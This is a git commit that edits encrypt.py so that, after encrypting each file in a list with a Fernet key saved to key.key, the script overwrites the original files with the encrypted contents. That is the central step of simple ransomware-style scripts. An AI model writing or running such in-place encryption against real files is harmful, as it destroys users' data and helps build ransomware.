2b1e26331a72987608f96a5de5a6dea9023fbaec
Benson <thongbenson010499@gmail.com>
2022-06-15 23:57:44 -0700

    edited encrypt.py: write back as encrypted file.

--- encrypt.py
+++ encrypt.py
@@ -17,9 +17,8 @@ with open("key.key", "wb") as thekey:
     thekey.write(key)                   # After open, will write the saved key value into the file.
 
 for file in files:
-    with open(file,"rb") as f:
+    with open(file, "rb") as f:
         contents = f.read()
     contents_encrypted = Fernet(key).encrypt(contents)  # encrypting the contents generated for each file
-
-
-
+    with open(file, "wb") as f:
+        f.write(contents_encrypted)                     # write it back as an encrypted file
